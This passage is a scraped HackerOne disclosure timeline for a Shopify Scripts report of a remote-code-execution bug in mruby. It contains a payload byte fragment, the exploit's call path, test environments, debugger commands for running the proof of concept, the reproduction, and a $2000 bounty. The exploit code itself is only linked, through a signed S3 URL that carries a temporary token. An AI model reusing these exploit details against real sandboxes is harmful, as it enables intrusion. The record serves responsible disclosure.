\u003ccode\u003e\\x08\\xa3\\x70\\0\\0\\0\\0\\0\u003c/code\u003e of the payload string. The \u003ccode\u003eOP_ERR\u003c/code\u003e opcode\u003cbr\u003e\nwill call \u003ccode\u003estrlen\u003c/code\u003e soon after (\u003ccode\u003eE_RUNTIME_ERROR\u003c/code\u003e -\u0026gt; \u003ccode\u003emrb_exc_get\u003c/code\u003e -\u0026gt;\u003cbr\u003e\n\u003ccode\u003emrb_class_get_under\u003c/code\u003e -\u0026gt; \u003ccode\u003eclass_from_sym\u003c/code\u003e -\u0026gt; \u003ccode\u003emrb_intern\u003c/code\u003e -\u0026gt;\u003ccode\u003estrlen\u003c/code\u003e).\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-03T21:24:47.820Z","updated_at":"2017-02-03T21:24:47.820Z","actor":{"username":"dgaletic","cleared":true,"url":"/dgaletic","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1471339,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. The patch was accepted upstream in https://github.com/mruby/mruby/commit/f3d4ff16d39b34585d41c31ffc09a0ffb512ff81\n\nSo that we can validate the RCE proof-of-concept, could you please provide the full details of what git SHA of mruby (and/or mruby-engine) you tested that on, what compiler you used to build it, what operating system you built on, how you launched the debugger, etc.? Thanks!\n\nOur next round of bounty decisions will take place in about two weeks, so we'll be in touch with you again soon.","markdown_message":"\u003cp\u003eThanks again for your report. The patch was accepted upstream in \u003ca title=\"https://github.com/mruby/mruby/commit/f3d4ff16d39b34585d41c31ffc09a0ffb512ff81\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2Ff3d4ff16d39b34585d41c31ffc09a0ffb512ff81\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/commit/f3d4ff16d39b34585d41c31ffc09a0ffb512ff81\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eSo that we can validate the RCE proof-of-concept, could you please provide the full details of what git SHA of mruby (and/or mruby-engine) you tested that on, what compiler you used to build it, what operating system you built on, how you launched the debugger, etc.? Thanks!\u003c/p\u003e\n\n\u003cp\u003eOur next round of bounty decisions will take place in about two weeks, so we\u0026#39;ll be in touch with you again soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-08T14:54:26.313Z","updated_at":"2017-02-08T14:54:26.313Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"dgaletic","url":"/dgaletic"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1486081,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We have built mruby with the following commit checked out: \n6420951463ec9ace9eecb50923dc6a1925a45d31\n\nAnd mruby-engine with: 09be20e\n\nWe have tested it on two platforms:\n* Arch Linux (with all packages updated as of 2017-02-09), built with gcc version 6.3.1 20170109 (GCC), glibc-2.24.\n* Linux Mint 17.3 (Cinnamon 64-bit), built with gcc version 4.8.4 \n(Ubuntu 4.8.4-2ubuntu1~14.04.3), libc 2.19-0ubuntu6.9. Debugger CGDB 0.6.7, \nran with the above POC saved as `payload`:\n\n`cgdb --args mruby/bin/mruby payload`\n\nWe also discovered improvements to the original POC in the meantime. The attached\nPOC works on the sandbox, and it is no longer necessary to search the memory\nfor the value 75; instead we get an appropriate value (33) in a direct manner\nthrough object_id. The updated POC was tested with either:\n\n* `/home/\u003cuser\u003e/mruby-engine/bin/sandbox payload-updated`\n*  `cgdb --args ruby /home/\u003cuser\u003e/mruby-engine/bin/sandbox payload-updated`","markdown_message":"\u003cp\u003eWe have built mruby with the following commit checked out: \u003cbr\u003e\n6420951463ec9ace9eecb50923dc6a1925a45d31\u003c/p\u003e\n\n\u003cp\u003eAnd mruby-engine with: 09be20e\u003c/p\u003e\n\n\u003cp\u003eWe have tested it on two platforms:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eArch Linux (with all packages updated as of 2017-02-09), built with gcc version 6.3.1 20170109 (GCC), glibc-2.24.\u003c/li\u003e\n\u003cli\u003eLinux Mint 17.3 (Cinnamon 64-bit), built with gcc version 4.8.4 \n(Ubuntu 4.8.4-2ubuntu1~14.04.3), libc 2.19-0ubuntu6.9. Debugger CGDB 0.6.7, \nran with the above POC saved as \u003ccode\u003epayload\u003c/code\u003e:\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003ccode\u003ecgdb --args mruby/bin/mruby payload\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eWe also discovered improvements to the original POC in the meantime. The attached\u003cbr\u003e\nPOC works on the sandbox, and it is no longer necessary to search the memory\u003cbr\u003e\nfor the value 75; instead we get an appropriate value (33) in a direct manner\u003cbr\u003e\nthrough object_id. The updated POC was tested with either:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e/home/\u0026lt;user\u0026gt;/mruby-engine/bin/sandbox payload-updated\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e \u003ccode\u003ecgdb --args ruby /home/\u0026lt;user\u0026gt;/mruby-engine/bin/sandbox payload-updated\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2017-02-14T23:53:28.262Z","updated_at":"2017-02-14T23:53:28.262Z","actor":{"username":"dgaletic","cleared":true,"url":"/dgaletic","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":160943,"filename":"payload-updated","type":"text/plain","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/160/943/cf48211647b0c0f464116dbc82db0a11dbb83ca7/payload-updated?response-content-disposition=attachment%3B%20filename%3D%22payload-updated%22%3B%20filename%2A%3DUTF-8%27%27payload-updated\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045339Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026X-Amz-Signature=cedc4be10d28b400ff489f8cf2e967e4dfa3b96a7cb2df93eefd1c9b95a4a328"}],"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1486243,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the additional information! I'll let you know once we've reproduced your results.","markdown_message":"\u003cp\u003eThanks for the additional information! I\u0026#39;ll let you know once we\u0026#39;ve reproduced your results.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-15T03:05:05.239Z","updated_at":"2017-02-15T03:05:05.239Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1509529,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just to follow up, I was able to reproduce your RCE proof of concept, so we'll take that into account when deciding the final bounty amount. Our next round of bounty payouts should be happening before long.","markdown_message":"\u003cp\u003eJust to follow up, I was able to reproduce your RCE proof of concept, so we\u0026#39;ll take that into account when deciding the final bounty amount. Our next round of bounty payouts should be happening before long.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-27T22:24:53.122Z","updated_at":"2017-02-27T22:24:53.122Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1509669,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify Scripts and the MRuby project!","markdown_message":"\u003cp\u003eThanks for helping improve the security of Shopify Scripts and the MRuby project!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-27T23:33:45.966Z","updated_at":"2017-02-27T23:33:45.966Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"2000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"dgaletic","url":"/dgaletic"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1509670,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-27T23:33:54.217Z","updated_at":"2017-02-27T23:33:54.217Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1510922,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-28T13:30:02.753Z","updated_at":"2017-02-28T13:30:02.753Z","actor":{"username":"dgaletic","cleared":true,"url":"/dgaletic","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1510923,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-28T13:30:02.799Z","updated_at":"2017-02-28T13:30:02.799Z","actor":{"username":"dgaletic","cleared":true,"url":"/dgaletic","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}